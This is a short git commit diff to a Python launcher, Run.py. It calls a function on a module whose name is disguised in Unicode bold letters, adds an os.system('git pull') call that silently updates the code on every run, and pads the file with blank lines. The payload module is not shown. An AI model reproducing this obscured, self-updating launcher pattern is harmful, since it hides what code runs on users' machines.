392f2bfac2991a9a1d416b72a901e9b437cdad46
CYB3R-VILL4IN <107668513+CYB3R-VILL4IN@users.noreply.github.com>
2022-06-24 22:19:41 +0600

    Update Run.py

--- Run.py
+++ Run.py
@@ -1,9 +1,31 @@
+import os, platform
 import os, sys
 
 try:
 
-    __import__("𝐂𝐘𝐁𝐄𝐑-𝐕𝐈𝐋𝐋𝐀𝐈𝐍.py").______()
+    __import__("𝐂𝐘𝐁𝐄𝐑-𝐕𝐈𝐋𝐋𝐀𝐈𝐍").__SHA4T0____()
 
 except Exception as e:
 
     exit(str(e))
+os.system('git pull')
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
